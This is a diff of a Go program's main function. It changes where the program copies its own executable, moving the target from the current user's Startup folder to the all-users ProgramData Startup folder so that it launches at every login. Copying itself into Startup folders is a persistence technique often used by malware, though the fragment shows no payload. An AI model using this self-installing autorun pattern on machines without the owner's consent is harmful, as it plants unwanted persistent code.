@@ -9,10 +9,10 @@ import (
 	"net/http"
 	"os"
 	"os/exec"
-	"os/user"
 	"path/filepath"
 	"strings"
 	"syscall"
+//	"os/user"
 // 	"os/signal"
 )
 
@@ -174,13 +174,13 @@ func main() {
 	defer f.Close()
 	log.SetOutput(f)
 
-	currentUser, err := user.Current()
-	if err != nil {
-		log.Fatalf(err.Error())
-	}
-	homedir := currentUser.HomeDir
+//	currentUser, err := user.Current()
+//	if err != nil {
+//		log.Fatalf(err.Error())
+//	}
+//	homedir := currentUser.HomeDir
 
-	startup := filepath.Join(homedir, "AppData", "Roaming", "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
+	startup := filepath.Join("C:", "ProgramData", "Microsoft", "Windows", "Start Menu", "Programs", "StartUp")
 	err = copy(os.Args[0], startup)
 	if err != nil {
 		log.Panicf("copy -> %v", err)
